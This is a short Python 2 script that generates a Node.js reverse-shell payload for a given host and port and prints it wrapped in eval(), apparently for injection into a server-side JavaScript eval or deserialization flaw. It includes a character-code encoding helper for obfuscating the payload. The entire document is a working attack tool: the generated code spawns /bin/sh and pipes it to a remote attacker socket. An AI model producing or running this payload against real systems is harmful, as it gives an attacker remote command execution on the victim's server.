import sys

if len(sys.argv) != 3:
    print "Usage: %s <HOST> <PORT>" % (sys.argv[0])
    sys.exit(0)


def charencode(string):
    encoded = []
    for char in string:
        encoded.append(str(ord(char)))
    return ','.join(encoded)

HOST = sys.argv[1]
PORT = sys.argv[2]

REV_SHELL = '''
const net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
const client = new net.Socket();
client.connect('%s', '%s', function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});
''' % (PORT, HOST)

# PAYLOAD = charencode(REV_SHELL)
PAYLOAD = REV_SHELL
# print "eval('String.fromCharCode(%s)')" % (PAYLOAD)
print "eval(`%s`)" % PAYLOAD